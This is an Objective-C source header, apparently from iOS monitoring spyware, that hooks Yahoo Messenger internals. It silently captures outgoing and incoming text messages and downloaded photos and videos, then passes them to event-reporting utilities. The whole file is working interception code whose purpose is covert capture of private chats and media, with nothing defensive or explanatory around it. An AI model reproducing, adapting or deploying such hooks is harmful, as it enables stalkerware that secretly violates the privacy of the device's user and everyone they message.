//
//  YahooMessenger.h
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 3/25/2557 BE.
//
//


#import <Foundation/Foundation.h>

#import "YahooMsgUtils.h"
#import "YahooAttachmentUtils.h"
#import "IMShareUtils.h"

#import "OCBackendIMYahoo.h"
#import "OCBackendIMYahoo+2-2-9.h"
#import "YMMessage.h"
#import "YMIdentity.h"
#import "YMFileTransferService.h"

#pragma mark -
#pragma mark OUTGOING MESSAGE
#pragma mark -

/*
 * Capture Outgoing Message
 * direction:   - Outgoing
 * chat type:   - Individual
 * usecase:     - When the sending sucesses
 */
HOOK(OCBackendIMYahoo,  messengerService$didSendMessage$, void, id service, id message) {
    DLog(@"\n\n&&&&&&&&&&&&&& OCBackendIMYahoo --> messengerService$   didSendMessage$ &&&&&&&&&&&&&&\n\n");
    DLog(@"service %@ %@", [service class], service);  // YMService
    DLog(@"message %@ %@", [message class], message);  // YMMessage
    
    CALL_ORIG(OCBackendIMYahoo, messengerService$didSendMessage$, service, message);
    
    YMMessage *ymMessage            = message;
    DLog(@"source cloudIdentifier %@", [[ymMessage source] cloudIdentifier])
    DLog(@"target cloudIdentifier %@", [[ymMessage target] cloudIdentifier])
    
    //DLog(@"source uid %@  cloud %d cloudIdentifier %@",  [[ymMessage source] uid], [[ymMessage source] cloud],   [[ymMessage source] cloudIdentifier]);
    //DLog(@"target uid %@  cloud %d cloudIdentifier %@",  [[ymMessage target] uid], [[ymMessage target] cloud],   [[ymMessage target] cloudIdentifier]);
    
    // Capture only instant message, not capture sms
    if (![[[ymMessage source] cloudIdentifier] isEqualToString:@"phone"]) {
        [YahooMsgUtils sendOutgoingTextMessageEventForYMMessage: ymMessage];
    }
}

#pragma mark -
#pragma mark OUTGOING PHOTO/VIDEO
#pragma mark -

/*
 * Capture Outgoing Photo/Video
 * direction:   - Outgoing
 * chat type:   - Individual
 * usecase:     - Every time user click the button 'Send'
 */
HOOK(OCBackendIMYahoo,  sendInstantMessage$, void, id message) {
    DLog(@"\n\n&&&&&&&&&&&&&& OCBackendIMYahoo --> sendInstantMessage &&&&&&&&&&&&&&\n\n");
    DLog(@"message %@", message);
    // message <OCInstantMessage:0x3f93240 text: "Hahahahah", sender: developerteam5, recipient:developerteam4, isLocal:1 messageId:(null)>
    // message <OCInstantMessagePhoto:0x6456ba0 filename: "Beginning File Transfer…", sender: developerteam5, recipient:developerteam4, status:-1, sessionID:(null)>
    
    Class $OCInstantMessagePhoto             = objc_getClass("OCInstantMessagePhoto");
    Class $OCInstantMessageDocument          = objc_getClass("OCInstantMessageDocument");
    
    if ([message isKindOfClass:[$OCInstantMessagePhoto class]]              ||
        [message isKindOfClass:[$OCInstantMessageDocument class]]           ){
        
        [YahooMsgUtils  sendOutgoingAttachmentMessageEventForMessage:message];
        
    } else {
        DLog(@"This hook method is used for OUT photo/video")
    }
    
    CALL_ORIG(OCBackendIMYahoo, sendInstantMessage$, message);  // OCInstantMessage for message and OCInstantMessagePhoto for photo
}

#pragma mark -
#pragma mark INCOMING MESSAGE
#pragma mark -

/*
 * Capture Incoming Message
 * direction:   - Incoming
 * chat type:   - Individual
 * usecase:     - When receive message
 */
HOOK(OCBackendIMYahoo,  messengerService$didReceiveMessages$, void, id service, id messages) {
    DLog(@"\n\n&&&&&&&&&&&&&& OCBackendIMYahoo --> messengerService$   didReceiveMessages$ &&&&&&&&&&&&&&\n\n");
    DLog(@"service %@ %@", [service class], service);  // YMService
    DLog(@"message %@ %@", [messages class], messages);
    
    CALL_ORIG(OCBackendIMYahoo, messengerService$didReceiveMessages$, service, messages);
  
    NSArray *ymMessageArray = messages;  // NSArray of YMMessage
    Class $YMMessage        = objc_getClass("YMMessage");
    
    for (id eachYMMessage in ymMessageArray) {
        if ([eachYMMessage isKindOfClass:[$YMMessage class]]) {
            [YahooMsgUtils sendIncomingTextMessageEventForYMMessage: eachYMMessage];
        }
    }
}


#pragma mark -
#pragma mark INCOMING PHOTO/VIDEO
#pragma mark -


/*
 * Capture Incoming Photo/Video STEP 1
 * direction:   - Incoming
 * chat type:   - Individual
 * usecase:     - After user click to Accept Photo/Video
 */

// Prior to 2.2.9
HOOK(OCBackendIMYahoo,  messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServer$token$, void,
     id service, id identity, id to, id anId, id name, int type, id server, id token) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& OCBackendIMYahoo --> messengerService$   didReceiveIncomingFileTransferFromIdentity$ &&&&&&&&&&&&&&\n\n");
    
    CALL_ORIG(OCBackendIMYahoo, messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServer$token$,
              service, identity, to, anId, name,  type, server, token);
    
    DLog(@"identity %@ %@", [identity class], identity);        // YMIdentity <YMIdentity: 0x5654d40, uid: developerteam5, cloud: yahoo>
    DLog(@"to %@ %@",       [to class], to);                    // YMIdentity <YMIdentity: 0x5654d40, uid: developerteam5, cloud: yahoo>
    DLog(@"session id %@ %@",  [anId class], anId);             // __NSCFString C60686B3-5D2F-4012-A08A-B92A18F3FEB2
    DLog(@"name %@ %@",     [name class], name);                // __NSCFString Image.jpg or Movie.mov
    
    [YahooMsgUtils storeIncomingAttachmentMessageEventFrom: identity
                                                    target: to
                                            attachmentName: name
                                                 sessionID: anId];
}

// 2.2.9
HOOK(OCBackendIMYahoo,  messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServerIP$relayServerHost$token$, void,
     id service, id identity, id to, id anId, id name, int type, id relayServerIP, id relayServerHost, id token) {
    
    DLog(@"!!!&&&&&&&&&&&&&& OCBackendIMYahoo --> messengerService$didReceiveIncomingFileTransferFromIdentity$...$serverHost$token$ &&&&&&&&&&&&&&!!!");
    
    
    CALL_ORIG(OCBackendIMYahoo, messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServerIP$relayServerHost$token$,
              service, identity, to, anId, name,  type, relayServerIP, relayServerHost, token);
    
    DLog(@"identity %@ %@", [identity class], identity);        // YMIdentity <YMIdentity: 0x5654d40, uid: developerteam5, cloud: yahoo>
    DLog(@"to %@ %@",       [to class], to);                    // YMIdentity <YMIdentity: 0x5654d40, uid: developerteam5, cloud: yahoo>
    DLog(@"session id %@ %@",  [anId class], anId);             // __NSCFString C60686B3-5D2F-4012-A08A-B92A18F3FEB2
    DLog(@"name %@ %@",     [name class], name);                // __NSCFString Image.jpg or Movie.mov
    
    [YahooMsgUtils storeIncomingAttachmentMessageEventFrom: identity
                                                    target: to
                                            attachmentName: name
                                                 sessionID: anId];
}

/*
 * Capture Incoming Photo/Video STEP 2
 * direction:   - Incoming
 * chat type:   - Individual
 * usecase:     - When the sended photo has been completed transerring.
 This method is called after messengerService$didReceiveOutgoingFileTransferFromIdentity$to$sessionId$fileName$type$token$
 */
HOOK(OCBackendIMYahoo,  fileTransferService$transferCompleteForSession$path$, void, id service, id session, id path) {
    DLog(@"\n\n&&&&&&&&&&&&&& OCBackendIMYahoo --> fileTransferService$   transferCompleteForSession$ &&&&&&&&&&&&&&\n\n");
    CALL_ORIG(OCBackendIMYahoo, fileTransferService$transferCompleteForSession$path$, service, session, path);
    
    DLog(@">> COMPLETE session %@ %@",  [session class], session);      // __NSCFString 7D860E53-9486-4B2B-B12A-267F82CB0DD9
    DLog(@">> ATTACHMENT path %@ %@",   [path class], path);            // for OUTGOING, this value is null.
                                                                        // NSPathStore2 /private/var/mobile/Applications/8AC45475-2FDC-4AFF-ADD1-61E8A0ED9116/tmp/FileTransfer-4F4C3629-EC64-491B-B4B5-0B8448C857C0.jpg
    YMFileTransferService *ymFileTransferService = service;
    
    DLog(@">> service %@ %@",       [ymFileTransferService class], ymFileTransferService);      //  YMFileTransferService <YMFileTransferService: 0x81c680>
    DLog(@">> downloads %@",        [ymFileTransferService downloads]);
    DLog(@">> downloadsCount %d",   [ymFileTransferService downloadsCount]);
    
    // Filter out outgoing Photo/Video
    if (path) {
        // get the session that has been kept previously in the previous hook method
        FxIMEvent *imEvent          = [[YahooAttachmentUtils sharedYahooAttachmentUtils] imEventForSessionID:session];
        NSString *attachmentName    = [imEvent mMessage];
        NSString * mediaPath        =  nil;
        DLog(@"imEvent %@", imEvent)
        
        if (imEvent) {
            DLog (@">> Incoming Photo/Video IMEvent exist!!")
            
            // traverse the array to get the right one
            for (id eachDownload in [ymFileTransferService downloads]) {
                DLog (@"eachDownload %@", eachDownload)
                if ([eachDownload isKindOfClass:[NSDictionary class]]) {
                    NSString *sessionInDownload     = [eachDownload objectForKey:@"sid"];
                    if ([sessionInDownload isEqualToString:session]) {
                        DLog(@"... process attachment of the COMPLETE session")
                        NSString *path              = [eachDownload objectForKey:@"path"];
                        if (path) {
                            // -- IMAGE
                            if ([IMShareUtils isImageMimetype:attachmentName]) {
                                
                                UIImage *image = [UIImage imageWithContentsOfFile:path];
                                if (image) {
                                    mediaPath       = [path copy];
                                } else {
                                    DLog(@"Corrupted Image file");
                                }
                            }
                            // -- VIDEO
                            else if ([IMShareUtils isVideoMimetype:attachmentName]) {
                                if ([IMShareUtils isVideo:path]) {
                                    mediaPath       = [path copy];
                                } else {
                                    DLog (@"Corrupted Video file")
                                }
                            }
                            // -- OTHERS
                            else {
                                DLog(@"... We not support this file type %@", [imEvent mMessage])
                                break;              // !!!!! BREAK - REASON: not media attachment
                            }
                            [imEvent setMMessage:nil];
                        }
                        break;                      // !!!!! BREAK - REASON: Completely process the attachment of the right session
                    }
                    
                } // is dictionary
            } // in download array
        }
        
        DLog(@"Capture IN Photo Event STEP 2 %@", imEvent);        
        if (mediaPath) {
            [YahooMsgUtils sendIncomingAttachment:[mediaPath autorelease]
                                          imEvent:imEvent
                                        sessionID:session];
        }
    } else {
         DLog(@"This hook method is used for IN photo/video")
    }
}





